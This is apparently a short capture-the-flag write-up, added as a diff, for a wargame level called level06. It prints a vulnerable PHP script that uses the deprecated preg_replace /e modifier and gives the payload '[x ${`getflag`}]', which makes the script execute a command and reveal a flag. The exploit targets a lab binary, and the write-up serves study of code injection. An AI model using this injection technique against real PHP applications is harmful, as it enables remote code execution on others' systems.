@@ -1,0 +1,34 @@
+cat level06.php and run it through an online prettyfier.
+
+#!/usr/bin/php
+< ? php
+function y($m) {
+    $m = preg_replace("/\./", " x ", $m);
+    $m = preg_replace("/@/", " y", $m);
+    return $m;
+}
+function x($y, $z) {
+    $a = file_get_contents($y);
+    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+    $a = preg_replace("/\[/", "(", $a);
+    $a = preg_replace("/\]/", ")", $a);
+    return $a;
+}
+$r = x($argv[1], $argv[2]);
+print $r; ?
+>
+
+Realised exlpoit could be made as they used old regex (The 'e' modifier which is now deprecated) 
+which is vulnerable as it can execute PHP code within the regex string.
+
+Create an exploit which runs the getflag file.
+
+cd /tmp
+
+vim test
+
+'[x ${`getflag`}]' into test
+
+run ./level06 /tmp/test
+
+Chucks out the flag because it executes getflag and thinks it's an undefined variable of name (wiok45aaoguiboiki2tuin6ub)
